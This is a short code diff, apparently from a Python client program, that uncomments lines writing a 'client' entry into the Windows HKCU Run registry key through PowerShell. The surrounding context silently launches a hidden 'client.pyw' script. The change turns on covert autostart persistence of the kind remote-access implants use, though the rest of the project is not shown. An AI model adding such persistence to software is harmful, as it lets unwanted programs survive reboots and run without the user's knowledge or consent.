@@ -12,8 +12,8 @@ subprocess.run(["powershell", "-Command", powershell_command], capture_output=Tr
 powershell_command = f'powershell.exe {path}\\client.pyw'
 subprocess.run(["powershell", "-Command", powershell_command], capture_output=True, text=True)
 
-# powershell_command = f'reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v client /t REG_SZ /d "' + file_path + '"'
-# subprocess.run(["powershell", "-Command", powershell_command], capture_output=True, text=True)
+powershell_command = f'reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v client /t REG_SZ /d "' + file_path + '"'
+subprocess.run(["powershell", "-Command", powershell_command], capture_output=True, text=True)
 
 # subprocess.call(
 #             'reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v client /t REG_SZ /d "' + file_path + '"',
